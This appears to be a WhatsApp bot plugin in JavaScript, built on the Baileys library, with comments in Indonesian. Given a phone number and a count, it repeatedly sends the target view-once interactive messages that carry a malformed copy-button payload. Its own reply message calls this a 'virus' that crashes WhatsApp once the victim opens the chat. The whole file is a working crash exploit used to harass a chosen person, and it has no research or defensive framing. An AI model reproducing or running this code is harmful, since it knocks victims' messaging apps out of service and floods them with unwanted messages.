import {
    createRequire
} from 'module'
const require = createRequire(import.meta.url)
let { proto, generateWAMessageFromContent } = require('@adiwajshing/baileys')
let handler = async (m, { conn, text, command }) => {
if (!text) throw `*Jangan salah gunakan om yah*\n\nExample: ${command} 628XXXXXX/10`
let num = text.split('/')[0]+"@s.whatsapp.net"
let jumlah = text.split('/')[1]
await m.reply(wait)
for (let i = 0; i < jumlah; i++) {
  setTimeout(() => {
  let msg = generateWAMessageFromContent(num, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "test"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "test"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "test",
            subtitle: "test",
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [             
              {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\`\`}"
              }             
           ],
          })
        })
    }
  }
}, {})

 conn.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
  }, i * 5000); // Delay setiap pengiriman selama 5 detik (5000 milidetik)
}
m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe🗿`)
}
//handler.help = ['🗿 <nomer/jumlah>']
//handler.tags = ['tools']
handler.command = /^(mem)$/i 
handler.owner = true 
export default handler